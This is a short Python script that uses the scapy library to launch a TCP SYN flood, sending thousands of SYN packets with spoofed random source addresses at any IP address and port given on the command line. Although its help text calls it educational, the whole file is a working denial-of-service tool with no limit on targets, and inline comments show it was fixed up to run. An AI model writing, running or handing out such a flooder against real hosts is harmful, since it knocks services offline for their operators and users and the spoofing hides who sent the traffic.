#!/usr/bin/env python3

from scapy.all import IP, TCP, send, RandIP, RandShort
import sys
import argparse
import ipaddress

def validate_ip(ip_str):
    try:
        ip = ipaddress.ip_address(ip_str)
        return True
    except ValueError as e:
        return False

def tcp_syn_flood(target_ip, target_port, packet_count=1000):
    """
        Sends a stream of TCP SYN packets with randomized source IPs to a target IP and port.
    """
    print(f"[*] Targeting {target_ip}:{target_port} with {packet_count} SYN packets...")
    print(f"[*] Press Ctrl+C to stop.")

    try:
        # Fixed: RandIP and RandShort are now imported, and 'flags' is plural
        packet = IP(src=RandIP(), dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
        send(packet, count=packet_count, inter=0, verbose=True)

        print("[+] Finished sending packet batch.")

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user. Exiting...")
        sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Educational script to test SYN Flood attack")
    parser.add_argument("--target-ip", "-t", required=True, help="Target IP Address")
    parser.add_argument("--target-port", "-p", default=80, type=int, help="Target Port")
    args = parser.parse_args()

    if not validate_ip(args.target_ip):
        print(f"[!] Invalid IP address '{args.target_ip}'")
        sys.exit(1)

    if not (0 <= args.target_port <= 65535): # Fixed logical check for valid port range
        print(f"[!] Invalid port number: '{args.target_port}'")
        sys.exit(0)

    tcp_syn_flood(args.target_ip, args.target_port, packet_count=5000)
